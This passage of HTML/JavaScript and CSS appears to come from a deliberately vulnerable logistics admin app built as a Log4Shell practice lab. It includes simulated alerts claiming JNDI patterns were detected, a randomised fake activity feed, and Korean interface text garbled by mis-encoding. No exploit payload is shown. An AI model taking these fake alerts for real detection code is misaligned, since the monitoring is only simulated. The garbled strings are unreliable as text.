showAlert('âš ï¸ JNDI íŒ¨í„´ì´ ê°ì§€ë˜ì–´ ë³´ì•ˆ ë¡œê·¸ì— ê¸°ë¡ë˜ì—ˆìŠµë‹ˆë‹¤.', 'warning');
}, 1500);
}
}

// ì•Œë¦¼ í‘œì‹œ
function showAlert(message, type = 'info') {
const alertClass = {
'success': 'alert-success',
'danger': 'alert-danger', 
'warning': 'alert-warning',
'info': 'alert-info'
}[type] || 'alert-info';

const alertHtml = `
<div class="alert ${alertClass} alert-dismissible fade show" role="alert">
${message}
<button type="button" class="btn-close" data-bs-dismiss="alert"></button>
</div>
`;

// ê¸°ì¡´ ì•Œë¦¼ ì œê±°
const existingAlerts = document.querySelectorAll('.alert:not(.vulnerability-warning)');
existingAlerts.forEach(alert => alert.remove());

document.querySelector('.container').insertAdjacentHTML('afterbegin', alertHtml);

// 5ì´ˆ í›„ ìë™ ì œê±°
setTimeout(() => {
const alert = document.querySelector(`.${alertClass}`);
if (alert) alert.remove();
}, 5000);
}

// ì—”í„°í‚¤ ê²€ìƒ‰
document.getElementById('userSearchInput').addEventListener('keypress', function(e) {
if (e.key === 'Enter') {
performUserSearch();
}
});

// í˜ì´ì§€ ë¡œë“œ ì‹œ ì• ë‹ˆë©”ì´ì…˜
document.addEventListener('DOMContentLoaded', function() {
const cards = document.querySelectorAll('.admin-card, .stats-card');
cards.forEach((card, index) => {
setTimeout(() => {
card.style.opacity = '0';
card.style.transform = 'translateY(20px)';
card.style.transition = 'all 0.6s ease';
setTimeout(() => {
    card.style.opacity = '1';
    card.style.transform = 'translateY(0)';
}, 100);
}, index * 100);
});
});

// ì‹¤ì‹œê°„ í™œë™ ì‹œë®¬ë ˆì´ì…˜
setInterval(function() {
if (Math.random() < 0.15) { // 15% í™•ë¥ ë¡œ ìƒˆ í™œë™ ì¶”ê°€
const activities = [
'ìƒˆë¡œìš´ ë¡œê·¸ì¸ ì‹œë„ê°€ ê°ì§€ë˜ì—ˆìŠµë‹ˆë‹¤',
'ì‚¬ìš©ì ê¶Œí•œì´ ë³€ê²½ë˜ì—ˆìŠµë‹ˆë‹¤',
'JNDI íŒ¨í„´ì´ ì…ë ¥ì—ì„œ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤',
'ë¹„ì •ìƒì ì¸ ê´€ë¦¬ì ì ‘ê·¼ì´ ê°ì§€ë˜ì—ˆìŠµë‹ˆë‹¤'
];

const randomActivity = activities[Math.floor(Math.random() * activities.length)];
console.log('ìƒˆ í™œë™:', randomActivity);

// ì‹¤ì œë¡œëŠ” í™œë™ í”¼ë“œ ì—…ë°ì´íŠ¸
}
}, 20000); // 20ì´ˆë§ˆë‹¤ ì²´í¬
</script>
</body>
</html><!DOCTYPE html>
<html lang="ko" xmlns:th="http://www.thymeleaf.org">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ì§ì› ê´€ë¦¬ - SecureLogistics</title>

<!-- Bootstrap 5 CSS -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<!-- Font Awesome Icons -->
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
<!-- DataTables CSS -->
<link href="https://cdn.datatables.net/1.13.4/css/dataTables.bootstrap5.min.css" rel="stylesheet">

<!-- Custom CSS -->
<style>
:root {
--logistics-primary: #2c3e50;
--logistics-secondary: #3498db;
--logistics-success: #27ae60;
--logistics-warning: #f39c12;
--logistics-danger: #e74c3c;
}

body {
background-color: #f8f9fa;
}

.admin-header {
background: linear-gradient(135deg, #6c5ce7, #a29bfe);
color: white;
padding: 2rem 0;
margin-bottom: 2rem;
}

.vulnerability-warning {
background: linear-gradient(45deg, #e17055, #fd79a8);
color: white;
padding: 1.5rem;
border-radius: 15px;
margin-bottom: 2rem;
box-shadow: 0 4px 15px rgba(225, 112, 85, 0.3);
}

.admin-card {
background: white;
border-radius: 15px;
box-shadow: 0 4px 15px rgba(0,0,0,0.08);
margin-bottom: 2rem;
overflow: hidden;
}

.admin-card-header {
background: linear-gradient(135deg, var(--logistics-primary), var(--logistics-secondary));
color: white;
padding: 1.5rem;
border: none;
}

.admin-card-body {
padding: 1.5rem;
}

.user-avatar {
width: 40px;
height: 40px;
border-radius: 50%;
background: linear-gradient(135deg, #667eea, #764ba2);
display: flex;
align-items: center;
justify-content: center;
color: white;
font-weight: bold;
margin-right: 1rem;
}

.user-status {
padding: 0.4rem 0.8rem;
border-radius: 20px;
font-size: 0.8rem;
font-weight: bold;
}

.status-active { background: #d4edda; color: #155724; }
.status-inactive { background: #f8d7da; color: #721c24; }
.status-suspended { background: #fff3cd; color: #856404; }

.search-container {
background: white;
border-radius: 15px;
padding: 1.5rem;
box-shadow: 0 4px 15px rgba(0,0,0,0.08);
margin-bottom: 2rem;
}

.search-input {
border-radius: 25px;
padding: 0.8rem 1.5rem;
border: 2px solid #e9ecef;
transition: all 0.3s ease;
}

.search-input:focus {
border-color: var(--logistics-secondary);
box-shadow: 0 0 0 0.2rem rgba(52, 152, 219, 0.25);
}

.btn-action {
margin: 0.2rem;
border-radius: 20px;
padding: 0.4rem 0.8rem;
font-size: 0.85rem;
transition: all 0.3s ease;
}

.btn-action:hover {
transform: scale(1.05);
}

.stats-card {
background: white;
border-radius: 15px;
padding: 1.5rem;
text-align: center;
box-shadow: 0 4px 15px rgba(0,0,0,0.08);
margin-bottom: 1.5rem;
transition: transform 0.3s ease;
}

.stats-card:hover {
transform: translateY(-5px);
}

.stats-icon {
font-size: 2.5rem;
margin-bottom: 1rem;
}

.activity-feed {
max-height: 400px;
overflow-y: auto;
}

.activity-item {
padding: 1rem;
border-left: 3px solid #e9ecef;
margin-bottom: 1rem;
background: #f8f9fa;
border-radius: 0 10px 10px 0;
}

.activity-item.warning {
border-left-color: var(--logistics-warning);
background: #fff8e1;
}

.activity-item.danger {
border-left-color: var(--logistics-danger);
background: #ffebee;
}

.role-badge {
font-size: 0.75rem;
padding: 0.3rem 0.6rem;
border-radius: 12px;
}

.role-admin { background: #e3f2fd; color: #1976d2; }
.role-user { background: #f3e5f5; color: #7b1fa2; }
.role-manager { background: #e8f5e8; color: #388e3c; }
</style>
</head>
<body>
<!-- Navigation -->
<nav class="navbar navbar-expand-lg navbar-light bg-white shadow-sm">
<div class="container">
<a class="navbar-brand" href="/">
<i class="fas fa-truck-moving me-2"></i>
SecureLogistics
</a>
<button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
<span class="navbar-toggler-icon"></span>
</button>
<div class="collapse navbar-collapse" id="navbarNav">
<ul class="navbar-nav me-auto">
<li class="nav-item">
    <a class="nav-link" href="/">
        <i class="fas fa-home me-1"></i>ëŒ€ì‹œë³´ë“œ
    </a>
</li>
<li class="nav-item">
    <a class="nav-link" href="/warehouse">
        <i class="fas fa-warehouse me-1"></i>ì…ê³ ê´€ë¦¬
    </a>
</li>
